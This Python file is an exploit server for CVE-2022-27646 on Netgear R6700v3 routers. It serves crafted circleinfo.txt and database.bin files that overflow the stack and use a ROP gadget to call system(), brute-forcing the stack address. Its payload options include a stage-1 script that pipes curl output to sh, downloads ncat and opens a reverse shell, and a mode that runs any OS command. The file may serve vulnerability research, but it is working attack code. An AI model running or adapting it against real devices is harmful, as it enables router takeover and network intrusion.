#!/usr/bin/env python3
## -*- coding: utf-8 -*-
from argparse     import RawTextHelpFormatter, ArgumentParser
from http.server  import BaseHTTPRequestHandler, HTTPServer
from os           import path
from urllib.parse import urlparse
from typing       import Dict

class HttpHandler(BaseHTTPRequestHandler):

    protocol_version = "HTTP/1.1"
    payload = "leg"
    cmd_ptr = 0xbeffc104 + 392 + 4
    
    def version_string(self) -> str:
        return "circled.server"
    
    def write_response(self, status_code: int, content_type: str, content: bytes) -> None:
        self.send_response(status_code)
        self.send_header("Content-Type", content_type)
        self.send_header("Content-Length", str(len(content)))
        self.end_headers()
        self.wfile.write(content)
        return
    
    def serve_file(self, filename: str) -> bytes:
        f = open(path.join(path.dirname(__file__), filename), "rb")
        b = f.read()
        f.close()
        return b
    
    def serve_stage0_payload(self, database: bool = False) -> bytes:
        payload = HttpHandler.payload
        cmd_ptr = HttpHandler.cmd_ptr

        # Serve requests for database.bin
        if database:
            if payload == "leg":
                return self.serve_file("resources/database.bin")
            return b"foobar"
        
        # Serve requests for circleinfo.txt
        if payload == "leg":
            return self.serve_file("resources/circleinfo.txt")
        elif payload == "pov":
            return b"A"*1021 + b" X"
        elif payload == "rsh":
            cmd = "curl http://127.0.0.1:5000/stage1|sh"
        else:
            cmd = payload

        # Replace spaces in the command (spaces cannot be used due to sscanf(str, "%s %s"))
        cmd = "touch${IFS}/tmp/st0;" + cmd.replace(" ", "${IFS}")

        # Generate payload
        max_cmd_len = 625-3
        p  = b"A"*368
        p += cmd_ptr.to_bytes(4, "little")        # g0_r6_val (addr. of OS command)
        p += b"B"*20
        p += b"\xb8\xc9\x00\x00"                  # g0_pc_val (addr. of ROP gadget 1: mov r0, r6; bl #0x94a0 <system@plt>)
        p += b"X"*(max_cmd_len-len(cmd)) + b";"   # Fill up with an inexisting command
        p += bytes(cmd, "UTF-8")[:max_cmd_len]    # OS command to execute
        p += b";#"
        p += b" X"                                # String separator: sscanf(str, "%s %s", ...)
        print(f"[*] Stage 0 payload: 0x{cmd_ptr:08x} '{cmd:s}'")

        # Brute force the stack
        HttpHandler.cmd_ptr = cmd_ptr - 0x1000

        return p
    
    def serve_stage1_payload(self) -> bytes:
        payload = b"""#!/bin/sh
        # Download ncat
        curl http://127.0.0.1:5000/stage1/ncat -o /tmp/ncat
        chmod +x /tmp/ncat

        # Run reverse shell
        /tmp/ncat -e "/bin/sh -i" 127.0.0.1 5001
        """
        return payload
    
    def do_GET(self) -> None:
        url_components = urlparse(self.path)
        # Stage 0 payload(s)
        if url_components.path == "/circleinfo.txt":
            self.write_response(200, "application/octet-stream", self.serve_stage0_payload(False))
        elif url_components.path == "/database.bin":
            self.write_response(200, "application/octet-stream", self.serve_stage0_payload(True))
        # Stage 1 payload(s)
        elif url_components.path == "/stage1":
            self.write_response(200, "application/octet-stream", self.serve_stage1_payload())
        elif url_components.path == "/stage1/ncat":
            self.write_response(200, "application/octet-stream", self.serve_file("bins/ncat"))
        # Not found
        else:
            self.write_response(404, "text/plain", b"Not found.")
        return


class HttpServer:

    def __init__(self, args: Dict) -> None:
        self.host = args.host
        self.port = args.port
        HttpHandler.payload = args.payload
        return
    
    def run(self) -> None:
        httpd = HTTPServer((self.host, self.port), HttpHandler)
        print(f"[+] HTTP server listens on '{self.host:s}:{self.port:d}'.")
        print(f"[+] Serving payload '{args.payload:s}'.")
        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            pass
        httpd.server_close()
        print(f"\n[+] HTTP server stopped.")
        return


if __name__ == "__main__":
    # Argument parsing
    description = """
    HTTP server delivering files `circleinfo.txt` and `database.bin` to exploit CVE-2022-27646 on
    Netgear R6700v3 routers.

    `--payload "leg"`: legitimate
            serve legitimate versions of files `circleinfo.txt` and `database.bin`
    `--payload "pov"`: proof of vulnerability
            serve files triggering the vulnerability
    `--payload "rsh"`: reverse shell
            serve files triggering a reverse shell connecting back to TCP port 5001
            use `./server/bins/ncat -l -p 5001` to catch the reverse shell
    `--payload OTHER`: OS command
            serve files running the specified OS command on the target
    """
    parser = ArgumentParser(description=description, formatter_class=RawTextHelpFormatter)
    parser.add_argument("--host", type=str, default="0.0.0.0",
                        help="host of the HTTP server (default: '%(default)s')")
    parser.add_argument("--port", type=int, default=5000,
                        help="port of the HTTP server (default: %(default)d)")
    parser.add_argument("--payload", type=str, default="leg",
                        help="payload (default: '%(default)s')")
    args =  parser.parse_args()

    # HTTP Server
    httpd = HttpServer(args)
    httpd.run()